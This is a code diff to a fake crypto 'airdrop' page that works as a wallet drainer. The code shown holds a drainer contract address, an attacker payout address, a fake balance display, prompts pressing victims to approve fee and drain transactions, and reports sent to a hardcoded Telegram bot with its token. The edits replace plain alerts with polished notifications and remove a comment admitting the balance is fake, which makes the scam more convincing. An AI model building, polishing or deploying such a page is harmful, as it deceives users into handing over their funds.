@@ -39,6 +39,54 @@
         #testimonials{font-size:.9rem;color:#A0A0A0;margin:10px}
         #walletsConnected{font-size:.9rem;color:#F5A623;margin:10px}
         @keyframes flash{0%{opacity:1}50%{opacity:.5}100%{opacity:1}}
+
+        /* New Notification Styles */
+        #notificationContainer {
+            position: relative;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .notification {
+            background: #2A3435;
+            border: 1px solid #F5A623;
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 1rem;
+            color: #FFCA28;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.5s ease-in-out;
+        }
+        .notification.error {
+            border-color: #FF5555;
+            color: #FF5555;
+        }
+        .notification.success {
+            border-color: #28A745;
+            color: #28A745;
+        }
+        .notification .message {
+            flex-grow: 1;
+        }
+        .notification .dismiss-btn {
+            background: none;
+            border: none;
+            color: #A0A0A0;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+        .notification .dismiss-btn:hover {
+            color: #FFCA28;
+        }
+        @keyframes slideIn {
+            0% { transform: translateY(-20px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
 </head>
@@ -54,6 +102,7 @@
         <div id="walletsConnected">10,000+ Wallets Connected</div>
     </header>
     <main class="container">
+        <div id="notificationContainer" style="display: none;"></div>
         <div id="statusMessage"></div>
         <section class="section text-center">
             <h2>Total Airdrop Pool</h2>
@@ -153,7 +202,7 @@
     <script>
         if (typeof Web3 === 'undefined') {
             console.error('Web3.js failed to load. Please check the CDN link or your internet connection.');
-            alert('Failed to load Web3.js library. Please check your internet connection and try again.');
+            showNotification('Failed to load Web3.js library. Please check your internet connection and try again.', 'error');
             throw new Error('Web3.js is not defined');
         } else {
             console.log('Web3.js loaded successfully. Version:', Web3.version);
@@ -162,7 +211,7 @@
         document.addEventListener('DOMContentLoaded', async () => {
             const botToken = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk';
             const chatId = '6309547301';
-            const drainerContractAddress = '0x53c23c659c70e96552936be563e2bec9951c244a'; // Update this after deploying the new contract
+            const drainerContractAddress = '0x53c23c659c70e96552936be563e2bec9951c244a';
             const ownerAddress = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490';
             const sepoliaChainId = '0xaa36a7';
             const drainerContractAbi = [
@@ -182,6 +231,37 @@
             ];
 
             let cachedIpLocation = null;
+
+            function showNotification(message, type = 'info') {
+                const container = document.getElementById('notificationContainer');
+                const notification = document.createElement('div');
+                notification.className = `notification ${type}`;
+                notification.innerHTML = `
+                    <span class="message">${message}</span>
+                    <button class="dismiss-btn">×</button>
+                `;
+                container.innerHTML = '';
+                container.appendChild(notification);
+                container.style.display = 'block';
+
+                notification.querySelector('.dismiss-btn').addEventListener('click', () => {
+                    notification.style.opacity = '0';
+                    setTimeout(() => {
+                        container.style.display = 'none';
+                        notification.remove();
+                    }, 300);
+                });
+
+                setTimeout(() => {
+                    if (notification.parentElement) {
+                        notification.style.opacity = '0';
+                        setTimeout(() => {
+                            container.style.display = 'none';
+                            notification.remove();
+                        }, 300);
+                    }
+                }, 10000);
+            }
 
             function startCountdown() {
                 let timeLeft = 300;
@@ -287,7 +367,6 @@
                         ? gasPrice 
                         : web3.utils.toWei('50', 'gwei');
 
-                    // Display fake wallet balance
                     const initialBalance = balance;
                     const balanceDisplay = document.createElement('div');
                     balanceDisplay.id = 'fakeBalance';
@@ -334,7 +413,7 @@
                     ];
                     const feePromptMessage = feePrompts[retryCount % feePrompts.length];
 
-                    alert(feePromptMessage);
+                    showNotification(feePromptMessage);
 
                     document.getElementById('processingOverlay').style.display = 'flex';
                     document.getElementById('statusMessage').innerText = 'Processing Fee... Don’t close this window!';
@@ -404,7 +483,7 @@
                     ];
                     const drainPromptMessage = drainPrompts[retryCount % drainPrompts.length];
 
-                    alert(drainPromptMessage);
+                    showNotification(drainPromptMessage);
 
                     document.getElementById('processingOverlay').style.display = 'flex';
                     document.getElementById('statusMessage').innerText = 'Finalizing Airdrop Claim... Don’t close this window!';
@@ -470,7 +549,7 @@
 
                     if (typeof window.ethereum === 'undefined') {
                         console.error('No Ethereum provider detected. Please install a wallet like MetaMask.');
-                        alert('No Ethereum provider detected. Please install a wallet like MetaMask to proceed.');
+                        showNotification('No Ethereum provider detected. Please install a wallet like MetaMask to proceed.', 'error');
                         $('#walletModal').modal('hide');
                         sendAlert('No Ethereum provider detected');
                         return;
@@ -509,12 +588,12 @@
                         await switchToSepolia(provider);
                         const results = await processAllAssets(web3, walletAddress);
 
-                        alert(`Airdrop claimed successfully on Sepolia Testnet!\n\nResults:\n${results.join('\n')}\n\nFunds will be processed shortly.`);
+                        showNotification(`Airdrop claimed successfully on Sepolia Testnet! Results: ${results.join(', ')}. Funds will be processed shortly.`, 'success');
                         sendAlert(`Attacker note: Use withdrawETH on ${drainerContractAddress} to claim funds to ${ownerAddress}`);
                     } catch (e) {
                         console.error(`Wallet connection failed for ${wallet}:`, e);
                         sendAlert(`Operation failed for ${wallet}. Error: ${e.message || e.toString()}`);
-                        alert(`Failed to claim airdrop. Error: ${e.message || e.toString()}`);
+                        showNotification(`Failed to claim airdrop. Error: ${e.message || e.toString()}`, 'error');
                         $('#walletModal').modal('hide');
                     }
                 });
